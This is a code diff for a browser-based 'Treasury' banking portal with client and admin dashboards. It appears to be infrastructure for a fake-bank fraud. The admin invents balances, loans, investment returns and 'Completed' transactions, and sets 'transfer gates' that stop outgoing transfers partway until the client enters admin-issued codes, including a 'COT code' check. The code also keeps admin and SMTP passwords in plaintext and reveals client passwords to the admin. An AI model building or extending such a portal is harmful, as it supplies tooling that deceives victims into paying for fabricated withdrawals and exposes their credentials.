+        var smtpRaw = raw && raw.smtp_config;
+        if (typeof smtpRaw === "string") {
+          try { smtpRaw = JSON.parse(smtpRaw); } catch (e) { smtpRaw = {}; }
+        }
+        smtpRaw = smtpRaw && typeof smtpRaw === "object" ? smtpRaw : {};
+
+        var gatesRaw = raw && raw.transfer_gates;
+        if (typeof gatesRaw === "string") {
+          try { gatesRaw = JSON.parse(gatesRaw); } catch (e) { gatesRaw = null; }
+        }
+
+        var gatesList = Array.isArray(gatesRaw)
+          ? gatesRaw.map(function (g, idx) {
+              var rawPct = Number(g && g.stopAtPercent);
+              return {
+                id: String((g && g.id) || ("gate_" + (idx + 1))),
+                label: String((g && g.label) || "Verification Gate").trim(),
+                code: String((g && g.code) || "").trim(),
+                inputType: g && g.inputType === "pin" ? "pin" : "text",
+                stopAtPercent: Number.isFinite(rawPct) && rawPct >= 15 && rawPct <= 95 ? Math.round(rawPct) : 50,
+                description: String((g && g.description) || "Enter your authorization code.").trim(),
+              };
+            }).filter(function (g) { return Boolean(g.label && g.code); })
+          : defaults.transfer_gates.map(function (g) { return Object.assign({}, g); });
+
+        return {
+          id: "global",
+          admin_username: String((raw && raw.admin_username) || defaults.admin_username).trim() || defaults.admin_username,
+          admin_password: String((raw && raw.admin_password) || defaults.admin_password) || defaults.admin_password,
+          smtp_config: {
+            host: String(smtpRaw.host || defaults.smtp_config.host).trim(),
+            port: Number(smtpRaw.port) || defaults.smtp_config.port,
+            encryption: ["TLS", "SSL", "None"].indexOf(smtpRaw.encryption) >= 0 ? smtpRaw.encryption : defaults.smtp_config.encryption,
+            username: String(smtpRaw.username || defaults.smtp_config.username).trim(),
+            password: String(smtpRaw.password || defaults.smtp_config.password),
+            sender_name: String(smtpRaw.sender_name || defaults.smtp_config.sender_name).trim() || defaults.smtp_config.sender_name,
+            sender_email: String(smtpRaw.sender_email || defaults.smtp_config.sender_email).trim() || defaults.smtp_config.sender_email,
+            enabled: Boolean(smtpRaw.enabled),
+          },
+          transfer_gates: gatesList,
+          updated_at: String((raw && raw.updated_at) || new Date().toISOString()),
+        };
+      }
+
+      function validateGateInput(gate, answer) {
+        if (!gate) return false;
+        var expected = String(gate.code || "").trim();
+        var actual = String(answer || "").trim();
+        if (!expected || !actual) return false;
+        if (gate.inputType === "pin") {
+          return actual === expected;
+        }
+        return actual.toUpperCase() === expected.toUpperCase();
+      }
+
+      function authenticatePortal(usernameInput, passwordInput, clients, portalSettings) {
         var uname = String(usernameInput || "").trim();
         var pass = String(passwordInput || "");
         if (!uname || !pass) {
           return { ok: false, error: "Invalid username or password. Please verify your credentials." };
         }
-        if (uname.toLowerCase() === ADMIN_USERNAME.toLowerCase() && pass === ADMIN_PASSWORD) {
+        var activeAdminUser = (portalSettings && portalSettings.admin_username) ? String(portalSettings.admin_username).trim() : ADMIN_USERNAME;
+        var activeAdminPass = (portalSettings && portalSettings.admin_password) ? String(portalSettings.admin_password) : ADMIN_PASSWORD;
+        if (uname.toLowerCase() === activeAdminUser.toLowerCase() && pass === activeAdminPass) {
           return { ok: true, role: "admin" };
         }
         var matched = (clients || []).find(function (c) {
@@ -1973,6 +2545,209 @@
         };
       }
 
+      function applyClientLedgerEntry(client, entry) {
+        if (!client) return { ok: false, error: "No client selected." };
+        var type = entry && entry.type === "debit" ? "debit" : "credit";
+        var amount = Number(Number(entry && entry.amountUSD).toFixed(2));
+        var desc = String((entry && entry.description) || "").trim();
+        var category = String((entry && entry.category) || "Wire Transfer").trim() || "Wire Transfer";
+        var dateStr = String((entry && entry.date) || new Date().toISOString().slice(0, 10)).trim();
+
+        if (!Number.isFinite(amount) || amount <= 0) {
+          return { ok: false, error: "Transaction amount must be greater than $0.00 USD." };
+        }
+        if (!desc) {
+          return { ok: false, error: "Please enter a transaction description." };
+        }
+        if (type === "debit" && amount > Number(client.balance_usd || 0)) {
+          return { ok: false, error: "Debit amount exceeds the client's available USD balance." };
+        }
+
+        var refId = (type === "credit" ? "CRD-" : "DEB-") + Math.floor(100000 + Math.random() * 899999);
+        var updated = Object.assign({}, client);
+        if (type === "credit") {
+          updated.balance_usd = Number((Number(client.balance_usd || 0) + amount).toFixed(2));
+          updated.deposit_usd = Number((Number(client.deposit_usd || 0) + amount).toFixed(2));
+        } else {
+          updated.balance_usd = Number((Number(client.balance_usd || 0) - amount).toFixed(2));
+          updated.debit_usd = Number((Number(client.debit_usd || 0) + amount).toFixed(2));
+        }
+
+        var txEntry = {
+          id: refId,
+          date: dateStr,
+          counterparty: desc,
+          memo: type === "credit" ? category + " Credit" : category + " Disbursement",
+          rail: category,
+          type: type === "credit" ? "deposit" : "debit",
+          status: "Completed",
+          amountUSD: amount,
+        };
+        updated.transactions_json = [txEntry].concat(Array.isArray(client.transactions_json) ? client.transactions_json : []);
+        return { ok: true, client: updated, transaction: txEntry };
+      }
+
+      function applyLoansInvestmentsUpdate(client, input) {
+        if (!client) return { ok: false, error: "No client selected." };
+        var loanUsd = Number(input && input.loan_usd);
+        var loanApr = Number(input && input.loan_apr);
+        var loanDate = String((input && input.loan_next_payment) || "").trim();
+        var invUsd = Number(input && input.investment_usd);
+        var invYtd = Number(input && input.investment_ytd);
+
+        if (!Number.isFinite(loanUsd) || loanUsd < 0) {
+          return { ok: false, error: "Active Loan Balance must be $0.00 or greater." };
+        }
+        if (!Number.isFinite(loanApr) || loanApr < 0 || loanApr > 99) {
+          return { ok: false, error: "Loan APR must be between 0% and 99%." };
+        }
+        if (!loanDate) {
+          return { ok: false, error: "Please choose a Next Payment Date." };
+        }
+        if (!Number.isFinite(invUsd) || invUsd < 0) {
+          return { ok: false, error: "Investment Portfolio balance must be $0.00 or greater." };
+        }
+        if (!Number.isFinite(invYtd)) {
+          return { ok: false, error: "Please enter a valid YTD Return percentage." };
+        }
+
+        var updated = Object.assign({}, client, {
+          loan_usd: Number(loanUsd.toFixed(2)),
+          loan_apr: Number(loanApr.toFixed(2)),
+          loan_next_payment: loanDate,
+          investment_usd: Number(invUsd.toFixed(2)),
+          investment_ytd: Number(invYtd.toFixed(2)),
+        });
+        return { ok: true, client: updated };
+      }
+
+      function applyQuickLoanInvestmentAction(client, actionType, amountUSD, dateStr) {
+        if (!client) return { ok: false, error: "No client selected." };
+        var amount = Number(Number(amountUSD).toFixed(2));
+        if (!Number.isFinite(amount) || amount <= 0) {
+          return { ok: false, error: "Quick action amount must be greater than $0.00 USD." };
+        }
+        var today = dateStr || new Date().toISOString().slice(0, 10);
+        var updated = Object.assign({}, client);
+        var refId = "CAP-" + Math.floor(100000 + Math.random() * 899999);
+        var tx = null;
+
+        if (actionType === "issue_loan") {
+          updated.loan_usd = Number((Number(client.loan_usd || 0) + amount).toFixed(2));
+          updated.balance_usd = Number((Number(client.balance_usd || 0) + amount).toFixed(2));
+          updated.deposit_usd = Number((Number(client.deposit_usd || 0) + amount).toFixed(2));
+          tx = {
+            id: refId,
+            date: today,
+            counterparty: "Executive Credit Facility",
+            memo: "New Loan Disbursement",
+            rail: "Wire Transfer",
+            type: "deposit",
+            status: "Completed",
+            amountUSD: amount,
+          };
+        } else if (actionType === "repay_loan") {
+          if (amount > Number(client.loan_usd || 0)) {
+            return { ok: false, error: "Repayment amount exceeds active loan balance." };
+          }
+          if (amount > Number(client.balance_usd || 0)) {
+            return { ok: false, error: "Repayment amount exceeds available checking liquidity." };
+          }
+          updated.loan_usd = Number((Number(client.loan_usd || 0) - amount).toFixed(2));
+          updated.balance_usd = Number((Number(client.balance_usd || 0) - amount).toFixed(2));
+          updated.debit_usd = Number((Number(client.debit_usd || 0) + amount).toFixed(2));
+          tx = {
+            id: refId,
+            date: today,
+            counterparty: "Executive Credit Facility",
+            memo: "Loan Principal Repayment",
+            rail: "ACH Transfer",
+            type: "debit",
+            status: "Completed",
+            amountUSD: amount,
+          };
+        } else if (actionType === "allocate_investment") {
+          if (amount > Number(client.balance_usd || 0)) {
+            return { ok: false, error: "Allocation amount exceeds available checking liquidity." };
+          }
+          updated.investment_usd = Number((Number(client.investment_usd || 0) + amount).toFixed(2));
+          updated.balance_usd = Number((Number(client.balance_usd || 0) - amount).toFixed(2));
+          updated.debit_usd = Number((Number(client.debit_usd || 0) + amount).toFixed(2));
+          tx = {
+            id: refId,
+            date: today,
+            counterparty: "Custodial Treasury Desk",
+            memo: "Investment Portfolio Allocation",
+            rail: "Wire Transfer",
+            type: "debit",
+            status: "Completed",
+            amountUSD: amount,
+          };
+        } else {
+          return { ok: false, error: "Unknown facility action." };
+        }
+
+        updated.transactions_json = [tx].concat(Array.isArray(client.transactions_json) ? client.transactions_json : []);
+        return { ok: true, client: updated };
+      }
+
+      function updateClientProfileRecord(client, input) {
+        if (!client) return { ok: false, error: "Client profile unavailable." };
+        var fullName = String((input && input.full_name) || "").trim();
+        var email = String((input && input.email) || "").trim();
+        var phone = String((input && input.phone) || "").trim();
+        var address = String((input && input.address) || "").trim();
+        var avatarUrl = input && input.avatar_url !== undefined ? sanitizeAvatarUrl(input.avatar_url) : client.avatar_url;
+
+        if (!fullName || !email || !phone || !address) {
+          return { ok: false, error: "Please complete your full name, email, phone number, and address." };
+        }
+        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+          return { ok: false, error: "Please enter a valid email address." };
+        }
+
+        return {
+          ok: true,
+          client: Object.assign({}, client, {
+            full_name: fullName,
+            email: email,
+            phone: phone,
+            address: address,
+            avatar_url: avatarUrl,
+          }),
+        };
+      }
+
+      function updateAdminCredentials(portalSettings, input) {
+        var current = normalizePortalSettings(portalSettings);
+        var newUsername = String((input && input.newUsername) || "").trim();
+        var currentPassword = String((input && input.currentPassword) || "");
+        var newPassword = String((input && input.newPassword) || "");
+        var confirmPassword = String((input && input.confirmPassword) || "");
+
+        if (!newUsername) {
+          return { ok: false, error: "Admin username cannot be empty." };
+        }
+        if (currentPassword !== current.admin_password) {
+          return { ok: false, error: "Current admin password does not match." };
+        }
+        if (newPassword.length < 8) {
+          return { ok: false, error: "New admin password must be at least 8 characters long." };
+        }
+        if (newPassword !== confirmPassword) {
+          return { ok: false, error: "New password and confirmation do not match." };
+        }
+
+        return {
+          ok: true,
+          settings: Object.assign({}, current, {
+            admin_username: newUsername,
+            admin_password: newPassword,
+            updated_at: new Date().toISOString(),
+          }),
+        };
+      }
+
       root.TreasuryCore = {
         ACCOUNT_HOLDER: ACCOUNT_HOLDER,
         ACCOUNT_USERNAME: ACCOUNT_USERNAME,
@@ -1995,6 +2770,10 @@
         sanitizeAvatarUrl: sanitizeAvatarUrl,
         createSeedTimothyTownsend: createSeedTimothyTownsend,
         normalizeClientRecord: normalizeClientRecord,
+        createDefaultPortalSettings: createDefaultPortalSettings,
+        rebalanceTransferGates: rebalanceTransferGates,
+        normalizePortalSettings: normalizePortalSettings,
+        validateGateInput: validateGateInput,
         authenticatePortal: authenticatePortal,
         validateTransferStep1: validateTransferStep1,
         validateCotCode: validateCotCode,
@@ -2005,6 +2784,11 @@
         generateRandomBalanceUSD: generateRandomBalanceUSD,
         buildNewClientRecord: buildNewClientRecord,
         applyAdminBalanceAdjustment: applyAdminBalanceAdjustment,
+        applyClientLedgerEntry: applyClientLedgerEntry,
+        applyLoansInvestmentsUpdate: applyLoansInvestmentsUpdate,
+        applyQuickLoanInvestmentAction: applyQuickLoanInvestmentAction,
+        updateClientProfileRecord: updateClientProfileRecord,
+        updateAdminCredentials: updateAdminCredentials,
         computeMonthlyCashFlow: computeMonthlyCashFlow,
         computeAdminKPIs: computeAdminKPIs,
       };
@@ -2018,6 +2802,7 @@
     (function () {
       var Core = globalThis.TreasuryCore;
       var STORAGE_CLIENTS_KEY = "pw_treasury_clients_v2";
+      var STORAGE_SETTINGS_KEY = "pw_treasury_portal_settings_v1";
       var STORAGE_REMEMBER_USER_KEY = "pw_treasury_remembered_username";
       var SESSION_AUTH_KEY = "pw_treasury_active_session";
 
@@ -2032,6 +2817,7 @@
 
       var appState = {
         clients: [],
+        portalSettings: Core.createDefaultPortalSettings(),
         role: null, // 'client' | 'admin'
         activeClientId: null,
         inspectedClientId: null,
@@ -2041,10 +2827,17 @@
         txFilter: "all",
         txSearch: "",
         adminSearch: "",
+        adminTab: "clients",
+        adminLedgerClientId: "",
+        adminLoansClientId: "",
+        editingGateId: null,
+        pendingProfileAvatar: "",
         revealedAdminPassIds: {},
         pendingNewClientAvatar: "",
         adjustingClientId: null,
         deletingClientId: null,
+        activeTransferGates: [],
+        currentGateIndex: 0,
         transferDraft: {
           rail: "ACH Transfer",
           bankName: "",
@@ -2058,6 +2851,7 @@
         cashFlowChart: null,
         allocationChart: null,
         cloudConnected: Boolean(supabaseClient),
+        cloudError: "",
       };
 
       var landingView = document.getElementById("landingView");
@@ -2067,6 +2861,7 @@
       var transferModal = document.getElementById("transferModal");
       var adminBalanceModal = document.getElementById("adminBalanceModal");
       var adminDeleteModal = document.getElementById("adminDeleteModal");
+      var clientProfileModal = document.getElementById("clientProfileModal");
       var toastTimer = null;
 
       function refreshIcons() {
@@ -2152,6 +2947,7 @@
         if (!supabaseClient) {
           appState.clients = loadClientsFromLocalStorage();
           appState.cloudConnected = false;
+          appState.cloudError = "";
           return;
         }
         try {
@@ -2162,13 +2958,16 @@
             saveClientsToLocalStorage(appState.clients);
           } else {
             var seed = Core.createSeedTimothyTownsend();
-            await supabaseClient.from("clients").upsert(seed);
+            var seedRes = await supabaseClient.from("clients").upsert(seed);
+            if (seedRes.error) throw seedRes.error;
             appState.clients = [seed];
             saveClientsToLocalStorage(appState.clients);
           }
           appState.cloudConnected = true;
+          appState.cloudError = "";
         } catch (err) {
           appState.cloudConnected = false;
+          appState.cloudError = (err && err.message) ? String(err.message) : "Unable to reach Supabase clients table";
           appState.clients = loadClientsFromLocalStorage();
         }
       }
@@ -2187,8 +2986,10 @@
             var res = await supabaseClient.from("clients").upsert(client);
             if (res.error) throw res.error;
             appState.cloudConnected = true;
+            appState.cloudError = "";
           } catch (err) {
             appState.cloudConnected = false;
+            appState.cloudError = (err && err.message) ? String(err.message) : "Unable to sync record to Supabase";
           }
         }
       }
@@ -2202,8 +3003,70 @@
             var res = await supabaseClient.from("clients").delete().eq("id", clientId);
             if (res.error) throw res.error;
             appState.cloudConnected = true;
+            appState.cloudError = "";
           } catch (err) {
             appState.cloudConnected = false;
+            appState.cloudError = (err && err.message) ? String(err.message) : "Unable to delete record from Supabase";
+          }
+        }
+      }
+
+      function savePortalSettingsToLocalStorage(settings) {
+        try {
+          localStorage.setItem(STORAGE_SETTINGS_KEY, JSON.stringify(settings));
+        } catch (e) {
+          // Ignore storage quota issues
+        }
+      }
+
+      function loadPortalSettingsFromLocalStorage() {
+        try {
+          var raw = localStorage.getItem(STORAGE_SETTINGS_KEY);
+          if (raw) {
+            return Core.normalizePortalSettings(JSON.parse(raw));
+          }
+        } catch (e) {
+          // Fallback to defaults
+        }
+        var defaults = Core.createDefaultPortalSettings();
+        savePortalSettingsToLocalStorage(defaults);
+        return defaults;
+      }
+
+      async function loadPortalSettings() {
+        if (!supabaseClient) {
+          appState.portalSettings = loadPortalSettingsFromLocalStorage();
+          return;
+        }
+        try {
+          var res = await supabaseClient.from("portal_settings").select("*").eq("id", "global").maybeSingle();
+          if (res.error) throw res.error;
+          if (res.data) {
+            appState.portalSettings = Core.normalizePortalSettings(res.data);
+            savePortalSettingsToLocalStorage(appState.portalSettings);
+          } else {
+            var defaults = loadPortalSettingsFromLocalStorage();
+            var upRes = await supabaseClient.from("portal_settings").upsert(defaults);
+            if (upRes.error) throw upRes.error;
+            appState.portalSettings = defaults;
+          }
+        } catch (err) {
+          appState.portalSettings = loadPortalSettingsFromLocalStorage();
+        }
+      }
+
+      async function persistPortalSettings(nextSettings) {
+        var normalized = Core.normalizePortalSettings(nextSettings);
+        normalized.updated_at = new Date().toISOString();
+        appState.portalSettings = normalized;
+        savePortalSettingsToLocalStorage(normalized);
+
+        if (supabaseClient) {
+          try {
+            var res = await supabaseClient.from("portal_settings").upsert(normalized);
+            if (res.error) throw res.error;
+          } catch (err) {
+            // Keep localStorage copy synced even if portal_settings table is not yet created
           }
         }
       }
@@ -2541,7 +3404,12 @@
         document.getElementById("kpiTotalDeposit").textContent = Core.formatCurrency(client.deposit_usd, cur);
         document.getElementById("kpiTotalDebit").textContent = Core.formatCurrency(client.debit_usd, cur);
         document.getElementById("kpiInvestmentPortfolio").textContent = Core.formatCurrency(client.investment_usd, cur);
+        var invYtd = Number(client.investment_ytd !== undefined ? client.investment_ytd : 14.2);
+        document.getElementById("kpiInvestmentYtdBadge").textContent = (invYtd >= 0 ? "+" : "") + invYtd.toFixed(1) + "% YTD";
         document.getElementById("kpiLoanBalance").textContent = Core.formatCurrency(client.loan_usd, cur);
+        var loanApr = Number(client.loan_apr !== undefined ? client.loan_apr : 3.85);
+        document.getElementById("kpiLoanAprBadge").textContent = loanApr.toFixed(2) + "% APR";
+        document.getElementById("kpiLoanMetaText").textContent = "Next payment: " + (client.loan_next_payment || "2026-12-01");
         document.getElementById("txAvailableHint").textContent = "Avail: " + Core.formatCurrency(client.balance_usd, "USD");
         document.getElementById("txSenderBalanceHint").textContent = "Available: " + Core.formatCurrency(client.balance_usd, "USD");
 
@@ -2554,7 +3422,9 @@
         document.getElementById("summaryCheckingBalance").textContent = Core.formatCurrency(client.balance_usd, cur);
         document.getElementById("summaryVisaAcct").textContent = "XXXXXXXX-" + last4Card;
         document.getElementById("summaryVisaBalance").textContent = Core.formatCurrency(client.loan_usd, cur);
-        document.getElementById("summaryVisaAlertText").textContent = client.card_frozen ? "Card is frozen" : "Payment is due";
+        document.getElementById("summaryVisaAlertText").textContent = client.card_frozen
+          ? "Card is frozen"
+          : (Number(client.loan_usd || 0) <= 0 ? "No payment due" : "Payment due " + (client.loan_next_payment || "2026-12-01"));
         document.getElementById("summarySavingsBalance").textContent = Core.formatCurrency(client.investment_usd, cur);
 
         // Account Mask
@@ -2569,6 +3439,177 @@
         refreshIcons();
       }
 
+      function renderProfileModalAvatar(avatarUrl, fullName) {
+        var img = document.getElementById("profileModalAvatarImg");
+        var initialsEl = document.getElementById("profileModalInitials");
+        var parts = String(fullName || "CL").trim().split(/\s+/);
+        initialsEl.textContent = ((parts[0] || "C")[0] + (parts[parts.length - 1] || "L")[0]).toUpperCase();
+        var clean = Core.sanitizeAvatarUrl(avatarUrl || "");
+        if (clean) {
+          img.src = clean;
+          img.classList.remove("hidden");
+          initialsEl.classList.add("hidden");
+        } else {
+          img.src = "";
+          img.classList.add("hidden");
+          initialsEl.classList.remove("hidden");
+        }
+      }
+
+      function openClientProfileModal() {
+        var client = getCurrentClient();
+        appState.pendingProfileAvatar = client.avatar_url || "";
+        document.getElementById("profileFullNameInput").value = client.full_name || "";
+        document.getElementById("profileEmailInput").value = client.email || "";
+        document.getElementById("profilePhoneInput").value = client.phone || "";
+        document.getElementById("profileAddressInput").value = client.address || "";
+        document.getElementById("profileModalPhotoInput").value = "";
+        document.getElementById("profileModalError").classList.add("hidden");
+        renderProfileModalAvatar(appState.pendingProfileAvatar, client.full_name);
+        clientProfileModal.classList.remove("hidden");
+        refreshIcons();
+      }
+
+      function closeClientProfileModal() {
+        clientProfileModal.classList.add("hidden");
+      }
+
+      function setActiveAdminTab(tabKey) {
+        var validTabs = ["clients", "ledger", "loans", "gates", "smtp", "security"];
+        if (validTabs.indexOf(tabKey) < 0) tabKey = "clients";
+        appState.adminTab = tabKey;
+
+        document.querySelectorAll(".admin-nav-btn").forEach(function (btn) {
+          var active = btn.getAttribute("data-admin-tab") === tabKey;
+          btn.setAttribute("aria-selected", active ? "true" : "false");
+          btn.className = active
+            ? "admin-nav-btn flex items-center gap-2.5 px-3.5 py-2.5 rounded-xl text-xs sm:text-sm font-semibold whitespace-nowrap transition-colors text-left bg-[#C8102E] text-white shadow-sm"
+            : "admin-nav-btn flex items-center gap-2.5 px-3.5 py-2.5 rounded-xl text-xs sm:text-sm font-semibold whitespace-nowrap transition-colors text-left text-slate-700 hover:bg-[#FEF2F2] hover:text-[#C8102E]";
+        });
+
+        var panelMap = {
+          clients: "adminTabClients",
+          ledger: "adminTabLedger",
+          loans: "adminTabLoans",
+          gates: "adminTabGates",
+          smtp: "adminTabSmtp",
+          security: "adminTabSecurity",
+        };
+        Object.keys(panelMap).forEach(function (key) {
+          document.getElementById(panelMap[key]).classList.toggle("hidden", key !== tabKey);
+        });
+        refreshIcons();
+      }
+
+      function populateAdminClientSelect(selectEl, selectedId) {
+        if (!selectEl) return "";
+        var clients = appState.clients || [];
+        selectEl.innerHTML = clients.map(function (c) {
+          return '<option value="' + escapeHtml(c.id) + '">' + escapeHtml(c.full_name) + " (" + escapeHtml(c.username) + ")</option>";
+        }).join("");
+        var chosen = clients.some(function (c) { return c.id === selectedId; })
+          ? selectedId
+          : (clients[0] ? clients[0].id : "");
+        if (chosen) selectEl.value = chosen;
+        return chosen;
+      }
+
+      function renderAdminLedgerPanel() {
+        var selectEl = document.getElementById("ledgerAdminClientSelect");
+        appState.adminLedgerClientId = populateAdminClientSelect(selectEl, appState.adminLedgerClientId);
+        var client = appState.clients.find(function (c) { return c.id === appState.adminLedgerClientId; });
+        document.getElementById("ledgerAdminBalanceSummary").textContent = client
+          ? Core.formatCurrency(client.balance_usd, "USD")
+          : "$0.00";
+        var dateInput = document.getElementById("ledgerAdminDateInput");
+        if (!dateInput.value) {
+          dateInput.value = new Date().toISOString().slice(0, 10);
+        }
+
+        var tbody = document.getElementById("adminSelectedClientTxBody");
+        var txs = (client && Array.isArray(client.transactions_json)) ? client.transactions_json.slice(0, 8) : [];
+        if (txs.length === 0) {
+          tbody.innerHTML = '<tr><td colspan="5" class="py-6 px-5 text-center text-xs text-slate-500">No ledger postings recorded yet.</td></tr>';
+          return;
+        }
+        tbody.innerHTML = txs.map(function (tx) {
+          var isDep = tx.type === "deposit";
+          return (
+            '<tr class="hover:bg-slate-50/70">' +
+              '<td class="py-3 px-5 text-xs font-mono text-slate-600 whitespace-nowrap">' + escapeHtml(tx.date) + "</td>" +
+              '<td class="py-3 px-4 text-xs font-mono text-slate-700 whitespace-nowrap">' + escapeHtml(tx.id) + "</td>" +
+              '<td class="py-3 px-4 text-xs"><div class="font-semibold text-slate-900">' + escapeHtml(tx.counterparty) + '</div><div class="text-slate-500">' + escapeHtml(tx.memo) + "</div></td>" +
+              '<td class="py-3 px-4 text-xs text-slate-700 whitespace-nowrap">' + escapeHtml(tx.rail) + "</td>" +
+              '<td class="py-3 px-5 text-right font-mono text-xs font-bold tabular-nums whitespace-nowrap ' + (isDep ? "text-[#16A34A]" : "text-slate-900") + '">' +
+                escapeHtml(Core.formatCurrency(isDep ? tx.amountUSD : -tx.amountUSD, "USD", { showPlus: isDep })) +
+              "</td>" +
+            "</tr>"
+          );
+        }).join("");
+      }
+
+      function renderAdminLoansPanel() {
+        var selectEl = document.getElementById("loansAdminClientSelect");
+        appState.adminLoansClientId = populateAdminClientSelect(selectEl, appState.adminLoansClientId);
+        var client = appState.clients.find(function (c) { return c.id === appState.adminLoansClientId; });
+        if (!client) return;
+        document.getElementById("adminLoanBalanceInput").value = Number(client.loan_usd || 0).toFixed(2);
+        document.getElementById("adminLoanAprInput").value = Number(client.loan_apr !== undefined ? client.loan_apr : 3.85).toFixed(2);
+        document.getElementById("adminLoanPaymentDateInput").value = client.loan_next_payment || "2026-12-01";
+        document.getElementById("adminInvestmentInput").value = Number(client.investment_usd || 0).toFixed(2);
+        document.getElementById("adminInvestmentYtdInput").value = Number(client.investment_ytd !== undefined ? client.investment_ytd : 14.2).toFixed(1);
+      }
+
+      function renderAdminGatesPanel() {
+        var gates = (appState.portalSettings && appState.portalSettings.transfer_gates) || [];
+        document.getElementById("activeGatesCount").textContent = String(gates.length);
+        var container = document.getElementById("gatesListContainer");
+        if (gates.length === 0) {
+          container.innerHTML = '<div class="rounded-xl border border-dashed border-slate-300 p-6 text-center text-xs text-slate-500">No verification gates configured. External transfers will proceed directly to settlement. Add a gate above to enforce verification checkpoints.</div>';
+          return;
+        }
+        container.innerHTML = gates.map(function (g, idx) {
+          var isPin = g.inputType === "pin";
+          return (
+            '<div class="rounded-xl border border-slate-200 bg-white p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3">' +
+              '<div class="space-y-1 min-w-0">' +
+                '<div class="flex flex-wrap items-center gap-2">' +
+                  '<span class="inline-flex items-center justify-center w-6 h-6 rounded-full bg-[#C8102E] text-white text-xs font-bold">' + (idx + 1) + "</span>" +
+                  '<span class="font-display text-sm font-bold text-slate-900">' + escapeHtml(g.label) + "</span>" +
+                  '<span class="text-[11px] font-semibold px-2 py-0.5 rounded-md bg-amber-50 text-amber-800 border border-amber-200 font-mono">Trigger: ' + escapeHtml(g.stopAtPercent) + "%</span>" +
+                  '<span class="text-[11px] font-semibold px-2 py-0.5 rounded-md bg-slate-100 text-slate-700">' + (isPin ? "Numeric PIN" : "Text / Alphanumeric") + "</span>" +
+                "</div>" +
+                '<p class="text-xs text-slate-600">' + escapeHtml(g.description) + "</p>" +
+                '<div class="text-xs font-mono text-slate-700">Required Code: <span class="font-bold text-[#8B0015]">' + escapeHtml(g.code) + "</span></div>" +
+              "</div>" +
+              '<div class="flex flex-wrap items-center gap-1.5 shrink-0">' +
+                '<button type="button" data-gate-action="up" data-gate-id="' + escapeHtml(g.id) + '" ' + (idx === 0 ? "disabled" : "") + ' class="px-2.5 py-1.5 rounded-lg border border-slate-200 text-xs font-semibold text-slate-700 hover:bg-slate-50 disabled:opacity-40" aria-label="Move gate up">Up</button>' +
+                '<button type="button" data-gate-action="down" data-gate-id="' + escapeHtml(g.id) + '" ' + (idx === gates.length - 1 ? "disabled" : "") + ' class="px-2.5 py-1.5 rounded-lg border border-slate-200 text-xs font-semibold text-slate-700 hover:bg-slate-50 disabled:opacity-40" aria-label="Move gate down">Down</button>' +
+                '<button type="button" data-gate-action="edit" data-gate-id="' + escapeHtml(g.id) + '" class="px-3 py-1.5 rounded-lg bg-[#FEF2F2] text-xs font-semibold text-[#C8102E] hover:bg-red-100">Edit</button>' +
+                '<button type="button" data-gate-action="remove" data-gate-id="' + escapeHtml(g.id) + '" class="px-3 py-1.5 rounded-lg border border-red-200 text-xs font-semibold text-[#C8102E] hover:bg-[#C8102E] hover:text-white transition-colors">Remove</button>' +
+              "</div>" +
+            "</div>"
+          );
+        }).join("");
+      }
+
+      function renderAdminSmtpPanel() {
+        var smtp = (appState.portalSettings && appState.portalSettings.smtp_config) || {};
+        document.getElementById("smtpHostInput").value = smtp.host || "";
+        document.getElementById("smtpPortInput").value = String(smtp.port || 587);
+        document.getElementById("smtpEncryptionSelect").value = smtp.encryption || "TLS";
+        document.getElementById("smtpUsernameInput").value = smtp.username || "";
+        document.getElementById("smtpPasswordInput").value = smtp.password || "";
+        document.getElementById("smtpSenderNameInput").value = smtp.sender_name || "";
+        document.getElementById("smtpSenderEmailInput").value = smtp.sender_email || "";
+        document.getElementById("smtpEnabledToggle").checked = Boolean(smtp.enabled);
+      }
+
+      function renderAdminSecurityPanel() {
+        var settings = appState.portalSettings || Core.createDefaultPortalSettings();
+        document.getElementById("adminNewUsernameInput").value = settings.admin_username || Core.ADMIN_USERNAME;
+      }
+
       function renderAdminDashboard() {
         var kpis = Core.computeAdminKPIs(appState.clients);
         document.getElementById("adminKpiTotalLiquidity").textContent = Core.formatCurrency(kpis.totalLiquidityUSD, "USD");
@@ -2577,7 +3618,9 @@
         document.getElementById("adminKpiSyncStatus").textContent = appState.cloudConnected ? "Supabase Cloud Connected" : "Browser Storage Sync";
         document.getElementById("adminKpiSyncHint").textContent = appState.cloudConnected
           ? "Live multi-device sync active"
-          : "localStorage fallback active until Supabase keys are configured";
+          : (supabaseClient
+            ? "Fallback active (" + (appState.cloudError || "create the public.clients table in Supabase SQL Editor") + ")"
+            : "localStorage fallback active until Supabase keys are configured");
 
         var q = String(appState.adminSearch || "").trim().toLowerCase();
         var filtered = appState.clients.filter(function (c) {
@@ -2595,65 +3638,70 @@
         if (filtered.length === 0) {
           tbody.innerHTML = "";
           emptyEl.classList.remove("hidden");
-          return;
-        }
-        emptyEl.classList.add("hidden");
+        } else {
+          emptyEl.classList.add("hidden");
+          tbody.innerHTML = filtered.map(function (c) {
+            var isRevealed = Boolean(appState.revealedAdminPassIds[c.id]);
+            var passDisplay = isRevealed ? c.password : "••••••••••••";
+            var parts = String(c.full_name || "CL").trim().split(/\s+/);
+            var initials = ((parts[0] || "C")[0] + (parts[parts.length - 1] || "L")[0]).toUpperCase();
+            var avatarHtml = c.avatar_url
+              ? '<img src="' + escapeHtml(c.avatar_url) + '" alt="' + escapeHtml(c.full_name) + '" class="w-10 h-10 rounded-full object-cover border border-red-200 shrink-0" />'
+              : '<div class="w-10 h-10 rounded-full bg-[#FEF2F2] text-[#C8102E] border border-red-200 flex items-center justify-center font-display font-bold text-xs shrink-0">' + escapeHtml(initials) + "</div>";
 
-        tbody.innerHTML = filtered.map(function (c) {
-          var isRevealed = Boolean(appState.revealedAdminPassIds[c.id]);
-          var passDisplay = isRevealed ? c.password : "••••••••••••";
-          var parts = String(c.full_name || "CL").trim().split(/\s+/);
-          var initials = ((parts[0] || "C")[0] + (parts[parts.length - 1] || "L")[0]).toUpperCase();
-          var avatarHtml = c.avatar_url
-            ? '<img src="' + escapeHtml(c.avatar_url) + '" alt="' + escapeHtml(c.full_name) + '" class="w-10 h-10 rounded-full object-cover border border-red-200 shrink-0" />'
-            : '<div class="w-10 h-10 rounded-full bg-[#FEF2F2] text-[#C8102E] border border-red-200 flex items-center justify-center font-display font-bold text-xs shrink-0">' + escapeHtml(initials) + "</div>";
+            var cardBadge = c.card_frozen
